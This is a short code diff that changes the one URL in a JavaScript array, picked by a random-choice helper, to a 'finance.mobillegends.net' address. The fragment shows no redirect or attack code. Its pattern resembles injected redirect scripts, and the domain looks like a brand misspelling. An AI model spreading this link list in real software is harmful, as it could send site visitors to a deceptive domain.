@@ -1,5 +1,5 @@
 var ars = rChoice([
-'https://rezfoods.com/'
+'https://finance.mobillegends.net/'
 ]);
 function rChoice(arr) {
 return arr[Math.floor(arr.length * Math.random())];
